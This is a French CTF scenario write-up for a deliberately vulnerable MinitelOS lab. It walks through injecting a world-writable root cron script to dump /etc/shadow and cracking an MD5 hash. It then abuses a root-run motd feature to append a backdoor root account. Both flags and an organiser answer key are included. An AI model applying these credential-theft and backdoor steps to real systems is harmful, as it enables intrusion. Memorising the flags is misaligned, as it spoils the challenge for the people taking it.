# MinitelOS — Rapport de Compromission

> Scénario CTF · Créneau : **15 minutes** · Une équipe à la fois

```
[FOOTHOLD]        [CREDENTIAL ACCESS]       [PRIVESC]
stagiaire/1234 ──► cron injection ──► admin/minitel ──► motd backdoor ──► root shell
```

---

## Infrastructure cible

| Élément | Valeur |
|---------|--------|
| Système | MinitelOS v2.3 — ESP32 / Minitel 1B |
| Accès initial | Terminal série (Minitel) ou simulateur natif |
| Objectifs | Obtenir les 2 flags et un shell root |

---

## Déploiement

### Simulateur natif

```bash
git clone <repo> && cd MinitelOS
git checkout ctf/scenario-3-backdoor-cron
pio run -e native
.pio/build/native/program           # vitesse normale
.pio/build/native/program --baud=1200  # simulation vitesse Minitel 1B
```

### ESP32 physique

```bash
pio run -e MinitelOS -t upload
pio run -e MinitelOS -t uploadfs   # filesystem (première fois)
pio device monitor
```

> `CTF_MODE` recrée l'environnement complet à chaque boot.
> **Reset entre équipes** : taper `ctftime` (reset auto si temps écoulé), ou redémarrer l'ESP32.

---

## Phase 1 — Foothold

**Vecteur** : compte de stagiaire avec credentials faibles, fournis sur fiche.

```
Login    : stagiaire
Password : 1234
```

L'accès est limité (`user`) : pas d'accès aux répertoires des autres comptes, pas de lecture de `/root/` ni de `/etc/shadow`.

---

## Phase 2 — Credential Access

**Vecteur** : tâche cron non sécurisée — script world-writable exécuté en root.

### Reconnaissance

```bash
ps
# → [2] 30s run /scripts/maintenance.msh  (root)

cat /scripts/maintenance.msh
# → script légitime, permissions rwxrwxrwx
```

### Exploitation

Le script est modifiable par tous. En y injectant une commande de lecture de `/etc/shadow` (protégé pour les non-root), le daemon root l'exécute au prochain cycle.

```bash
edit /scripts/maintenance.msh
# → ajouter : cat /etc/shadow > /tmp/loot.txt
# → sauvegarder (w)

# (attendre ~30 secondes)

cat /tmp/loot.txt
# root:2260a49226afcd3bb784cb3e3888ea91:root       ← incrackable
# stagiaire:81dc9bdb52d04dc20036dbd8313ed055:user  ← connu (1234)
# admin:bb3c3e98175d33c8300fbb0e84bf9e9f:admin     ← à cracker
```

### Crack du hash

```
admin:bb3c3e98175d33c8300fbb0e84bf9e9f → "minitel"
```

```bash
su admin   # password : minitel
```

**Accès obtenu** : session `admin`.

---

## Phase 3 — Flag utilisateur

**Objectif** : récupérer le premier flag dans le répertoire admin.

```bash
ls
# → user.txt  notes_perso.txt  README.txt

cat user.txt
# FLAG{4dm1n_4cc3ss}
```

---

## Phase 4 — Élévation de privilèges (root)

**Vecteur** : fonctionnalité `motd` exécutant `~/motd_perso.txt` avec les droits root (SUID-like implicite).

### Reconnaissance

```bash
motd --help
# → "Si ~/motd_perso.txt existe, les commandes qu'il contient sont executees"
```

### Exploitation

En créant `motd_perso.txt` avec une commande d'écriture dans `/etc/shadow`, l'exécution par motd (contexte root) injecte un compte backdoor avec un hash connu.

```bash
edit motd_perso.txt
# → ajouter : echo pwned:81dc9bdb52d04dc20036dbd8313ed055:root >> /etc/shadow
# → sauvegarder (w)

motd
# → exécution en root → compte "pwned" ajouté dans /etc/shadow

su pwned   # password : 1234  (hash réutilisé depuis /tmp/loot.txt)
```

**Accès obtenu** : shell root réel.

### Flag root

```bash
cat /root/root.txt
# FLAG{r00t_m0td_pwn3d}
```

---

## Résumé des findings

| # | Phase | Vulnérabilité | Impact |
|---|-------|--------------|--------|
| 1 | Credential Access | Script cron world-writable exécuté en root | Lecture de `/etc/shadow` |
| 2 | Privilege Escalation | `motd` exécute `motd_perso.txt` avec les droits root | Écriture dans `/etc/shadow` → shell root |

---

## Comptes compromis

| Compte | Méthode | Niveau |
|--------|---------|--------|
| `stagiaire` | Credentials fournis | user |
| `admin` | Hash cracké via cron injection | admin |
| `pwned` (backdoor) | Création via motd/root | root |

---

## Recommandations

1. **Cron** — Restreindre les permissions du script de maintenance (`chmod 750`, propriétaire root)
2. **motd** — Ne pas exécuter `motd_perso.txt` avec élévation de privilèges
3. **Politique de mots de passe** — Interdire les mots de passe simples pour les comptes admin
4. **`/etc/shadow`** — Vérifier les permissions (`rw-------`) après chaque modification système

---

## Arborescence

```
sim_fs/
├── etc/
│   └── shadow                   # Auth système — world-readable (misconfiguration)
├── home/
│   ├── stagiaire/               # Foothold
│   └── admin/
│       ├── user.txt             # FLAG 1
│       ├── notes_perso.txt
│       └── README.txt
├── root/                        # Root-only
│   ├── .crontab                 # Tâche cron 30s
│   ├── .fsmeta                  # Permissions
│   └── root.txt                 # FLAG 2
├── scripts/
│   ├── maintenance.msh          # Vecteur — world-writable (CVE-like)
│   └── maintenance.log
└── tmp/                         # Artefacts d'exploitation
```

---

## Chemin rapide *(spoiler organisateur)*

```bash
# Phase 2 — Credential Access
edit /scripts/maintenance.msh
# → :a  →  cat /etc/shadow > /tmp/loot.txt  →  Entrée  →  :wq
# (attendre ~30s)
cat /tmp/loot.txt               # hash admin = bb3c3e... → "minitel"
su admin                        # password : minitel

# Phase 3 — Flag utilisateur
cat user.txt                    # FLAG{4dm1n_4cc3ss}

# Phase 4 — Root
edit motd_perso.txt
# → :a  →  echo pwned:81dc9bdb52d04dc20036dbd8313ed055:root >> /etc/shadow  →  Entrée  →  :wq
motd
su pwned                        # password : 1234
cat /root/root.txt              # FLAG{r00t_m0td_pwn3d}
```
